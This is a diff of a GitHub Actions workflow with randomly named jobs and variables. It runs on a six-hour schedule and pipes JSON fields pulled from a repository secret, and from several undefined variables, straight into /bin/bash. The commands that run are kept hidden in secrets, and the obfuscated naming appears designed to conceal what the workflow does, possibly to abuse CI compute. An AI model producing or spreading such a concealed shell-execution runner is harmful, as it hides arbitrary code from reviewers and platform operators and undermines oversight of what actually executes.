@@ -1,23 +1,22 @@
 name: lujiancheng2345
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 1/6 * * *'
-
-jobs:  # 29923
+    - cron: '52 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: lujiancheng2345
         env:
-          w14: ${{ secrets.w14 }}
+          hbzm352: ${{ secrets.hbzm352 }}
         run: |
-          echo $w14 | jq -r .yr920 | /bin/bash
-          echo $b717 | jq -r .jyhgp359 | /bin/bash
-          echo $pazpv9 | jq -r .hni4344 | /bin/bash
-          echo $g531 | jq -r .eidr33931 | /bin/bash
-          echo $s893 | jq -r .jl2 | /bin/bash
-          echo $s1654 | jq -r .jqx42055 | /bin/bash
-          echo $cna4780 | jq -r .vw9 | /bin/bash
+          echo $hbzm352 | jq -r .gbjig9 | /bin/bash
+          echo $llo571 | jq -r .zwpdn84995 | /bin/bash
+          echo $yyws75 | jq -r .dhi69604 | /bin/bash
+          echo $dqege28 | jq -r .s6358 | /bin/bash
+          echo $cmsj95380 | jq -r .ms40680 | /bin/bash
+          echo $r08 | jq -r .l9 | /bin/bash
 
